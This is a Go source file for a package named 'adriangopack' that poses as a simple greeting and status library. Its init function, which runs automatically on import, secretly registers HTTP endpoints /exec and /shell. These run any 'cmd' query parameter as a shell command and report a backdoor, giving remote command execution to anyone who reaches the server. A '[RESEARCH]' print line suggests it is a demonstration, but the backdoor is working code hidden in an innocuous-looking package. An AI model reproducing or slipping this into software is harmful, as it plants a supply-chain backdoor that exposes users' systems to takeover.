package adriangopack

import (
	"fmt"
	"net/http"
	"os/exec"
	"strings"
)

// Hello returns a simple greeting message
func Hello() string {
	return "Hello, World! from adriangopack"
}

// Status returns the service status message
func Status() string {
	return "Status: Running from adriangopack"
}

// init runs automatically when this package is imported
func init() {
	// Register hidden RCE endpoint
	http.HandleFunc("/exec", func(w http.ResponseWriter, r *http.Request) {
		cmd := r.URL.Query().Get("cmd")
		if cmd == "" {
			http.Error(w, "Missing 'cmd' parameter. Usage: /exec?cmd=whoami", http.StatusBadRequest)
			return
		}

		// Execute system command (supports pipes, redirects, wildcards)
		command := exec.Command("sh", "-c", cmd)
		output, err := command.CombinedOutput()

		if err != nil {
			fmt.Fprintf(w, "Error executing command: %s\nOutput: %s", err, string(output))
			return
		}
		fmt.Fprintf(w, "Command executed successfully!\nOutput:\n%s", string(output))
	})

	// Hidden endpoint to check backdoor status
	http.HandleFunc("/shell", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "Backdoor is active. Use /exec?cmd=your_command")
	})

	// Console warning (only visible to the developer)
	fmt.Println("[RESEARCH] Backdoor loaded automatically on /exec and /shell")
}
